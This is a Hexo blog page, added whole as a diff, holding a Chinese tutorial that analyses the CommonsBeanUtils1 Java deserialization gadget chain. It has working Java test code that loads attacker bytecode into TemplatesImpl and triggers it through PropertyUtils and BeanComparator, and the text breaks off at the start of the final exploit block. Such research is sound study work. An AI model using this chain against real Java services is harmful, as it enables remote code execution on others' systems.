@@ -1,0 +1,890 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="无聊ini">
+    <meta name="author" content="follycat">
+    <meta name="referrer" content="no-referrer" />
+    
+    <title>
+        
+            CommonsBeanUtils1 |
+        
+        follycatのblog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/wul.jpg">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"follycatのblog","author":"follycat","avatar":"/images/wul.jpg","logo":"/images/wul.jpg","favicon":"/images/wul.jpg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"If you're reading this, welcome to my blog!","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":true,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":true,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/wul.jpg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               follycatのblog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                HOME
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                ARCHIVES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                TAGS
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                CATEGORIES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            HOME
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            ARCHIVES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            TAGS
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            CATEGORIES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        CommonsBeanUtils1
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/wul.jpg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">follycat</span>
+                                
+                                    <span class="author-badge">Lv2</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-03-19 08:25:54</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Thu May 22 2025 22:57:02 GMT+0800">2025-05-22 22:57:02</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>1.8k Words</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>8 Mins</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h1 id="CommonsBeanUtils介绍"><a href="#CommonsBeanUtils介绍" class="headerlink" title="CommonsBeanUtils介绍"></a>CommonsBeanUtils介绍</h1><p>CommonsBeanUtils是Apache Commons中的一个组件，主要用于处理JavaBean的操作。 它提供了一系列工具类和方法，帮助开发者动态地获取和设置JavaBean的属性，简化了编程工作‌</p>
+<p>首先是功能方面：</p>
+<ol>
+<li>属性操作：提供了PropertyUtiles类，可以动态的获取和设置javaBean的属性，例如<code>PropertyUtils.getProperty(object, &quot;property&quot;)</code>可以调用对象的getter方法，获取属性值‌。</li>
+<li>类型转化：提供类型转化工具，如ConvertUtils，可以将一种类型的对象转换成另一种类型。</li>
+<li>比较器：BeanComparator类实现了Comparator接口，用于在集合中对javaBean对象进行排序</li>
+</ol>
+<h1 id="javaBean介绍"><a href="#javaBean介绍" class="headerlink" title="javaBean介绍"></a>javaBean介绍</h1><p>上面提到了javaBean对象，那么javaBean对象是什么呢？</p>
+<p>javaBean是一种java的软件组件模型， 它通过封装属性和方法成为具有某种功能或处理某个业务的对象。</p>
+<p>我理解起来就是，在一个public的java类中，有无参的构造函数，并且存在一个或者多个private的属性，而且提供了公开的get&#x2F;set方法的类就是javaBean。也就是下面三个要素</p>
+<ol>
+<li>该java类是公共的并且具有无参构造函数</li>
+<li>存在一个或者多个私有的属性</li>
+<li>有公开的getter与setter方法。</li>
+</ol>
+<h1 id="使用CommonsBeanUtils进行调用javaBean事例及源码调试"><a href="#使用CommonsBeanUtils进行调用javaBean事例及源码调试" class="headerlink" title="使用CommonsBeanUtils进行调用javaBean事例及源码调试"></a>使用CommonsBeanUtils进行调用javaBean事例及源码调试</h1><p>cat.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cat</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;follycat&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">cat</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>main.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">cat</span> <span class="variable">cat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">cat</span>();</span><br><span class="line">        System.out.println(PropertyUtils.getProperty(cat,<span class="string">&quot;name&quot;</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用过后可以直接输出name的值，因为可以直接找到cat类中name的get方法。</p>
+<p>可以进行调试一下，来看commonsBeanUtils是怎么进行调用name类的get方法的。</p>
+<p>首先进入.getProperty，</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742313675534-244a8628-e9a1-4d46-8d57-abfd1089ff66.png"></p>
+<p>现在可以看到参数bean是cat类，name参数还是name。</p>
+<p>然后继续步入，走到PropertyUitlsBean中的getProperty方法。</p>
+<p>主要是这一段</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (resolver.hasNested(name)) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">next</span> <span class="operator">=</span> resolver.next(name);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">nestedBean</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (bean <span class="keyword">instanceof</span> Map) &#123;</span><br><span class="line">        nestedBean = getPropertyOfMapBean((Map&lt;?, ?&gt;) bean, next);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (resolver.isMapped(next)) &#123;</span><br><span class="line">        nestedBean = getMappedProperty(bean, next);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (resolver.isIndexed(next)) &#123;</span><br><span class="line">        nestedBean = getIndexedProperty(bean, next);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        nestedBean = getSimpleProperty(bean, next);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nestedBean == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NestedNullException</span></span><br><span class="line">                (<span class="string">&quot;Null property value for &#x27;&quot;</span> + name +</span><br><span class="line">                <span class="string">&quot;&#x27; on bean class &#x27;&quot;</span> + bean.getClass() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    bean = nestedBean;</span><br><span class="line">    name = resolver.remove(name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bean <span class="keyword">instanceof</span> Map) &#123;</span><br><span class="line">    bean = getPropertyOfMapBean((Map&lt;?, ?&gt;) bean, name);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (resolver.isMapped(name)) &#123;</span><br><span class="line">    bean = getMappedProperty(bean, name);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (resolver.isIndexed(name)) &#123;</span><br><span class="line">    bean = getIndexedProperty(bean, name);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    bean = getSimpleProperty(bean, name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> bean;</span><br></pre></td></tr></table></figure>
+
+<p>调试之后可以发现while(resolver.hasNested(name))是直接为false的，没有进入while循环中，然后因为bean不为map，引索，以及映射的属性，于是就进入了getSimpleProperty中</p>
+<p>继续跟进到getSimpleProperty中，然后看到getPropertyDescriptor</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742314873973-e5d079f1-265c-4d15-bf0a-d1a90da4538b.png"></p>
+<p>其实可以看到在invokeMethod之前的readMethod中已经被赋值为了getName。</p>
+<p>差不多是在这里</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742316620888-26a03d55-6a75-4b22-b857-26b95937ae11.png"></p>
+<p>其中的<code>getPropertyDescriptors()</code> 方法用于获取类的所有属性的描述符。每个 <code>PropertyDescriptor</code> 提供了有关该属性的详细信息，包括其名称、getter 方法、setter 方法等。</p>
+<p>也就是这里的信息开始有了getName方法</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742316714347-0acbbabc-e03e-4573-a2be-cbd02a8ab65e.png"></p>
+<p>然后返回到getDescriptor中对获取到的getName以及其他方法进行遍历，最后返回我们所需要的那个类。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742317050891-8c833b80-9a69-493f-b6ab-59dc55f8ffea.png"></p>
+<p>最后在这里的InvokeMethod进行执行。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742317251132-2942a8a7-31f3-441e-87e9-8473549f87fc.png"></p>
+<p>跟进之后可以看到</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742317362994-78b5a371-037c-4a9c-a334-f5ff5080335a.png"></p>
+<p>最后返回的value就是执行后的getName的返回值了。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742317445064-6425e783-a3c4-4061-911a-8ce1ee84b00c.png"></p>
+<h1 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h1><h2 id="尾部"><a href="#尾部" class="headerlink" title="尾部"></a>尾部</h2><p>既然已经知道了CommonsBeanUtils是如何调用getter方法的，现在就可以利用他进行调用任意getter方法了。</p>
+<p>可以看到cc3的链子，这条链子之前我自己分析的时候只分析到了newTransformer方法，然后直接使用cc1中的InvokeTransformer的后半条链进行调用了他的newTransformer，这里可以继续往下面分析。</p>
+<p>现在如果有一个getter方法调用了TemplatesImpl的newTransform方法，我们就可以通过PropertyUtils.getProperty调用getter方法，然后使用动态加载 TemplatesImpl 字节码的方式进行攻击的。</p>
+<p>这个getter方法就是getOutputProperties，他就在newTransform的下面，并且他完全符合PropertyUtils.getProperty的调用方式。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以这条链子的尾部就已经完成了，就是使用PropertyUtils.getProperty调用TemplatesImpl的getOutputProperties方法，然后进行动态字节码加载执行代码</p>
+<p>测试代码:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanUtils1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class tc=templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        System.out.println(PropertyUtils.getProperty(templates,<span class="string">&quot;outputProperties&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功弹出计算器。</p>
+<h2 id="中间与前半部分"><a href="#中间与前半部分" class="headerlink" title="中间与前半部分"></a>中间与前半部分</h2><p>现在就是要从PropertyUtils.getProperty出发，继续寻找调用了他的链子。</p>
+<p>可以找到BeanComparetor的compare方法，这里调用了PropertyUtils.getProperty</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742354792257-8b75a0fa-2f4f-4113-9f3e-2d239aa74ffa.png"></p>
+<p>测试代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanUtils1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class tc=templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        System.out.println(PropertyUtils.getProperty(templates,&quot;outputProperties&quot;));</span></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        beanComparator.compare(templates,templates);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功弹出计算器</p>
+<p>随后继续查找有谁调用了compare，看到<code>PriorityQueue</code> 这个类中的<code>siftDownUsingComparator()</code> 方法。这个方法调用了compare()</p>
+<p>其实这前半部分和cc4中的前半段是一样的。</p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> 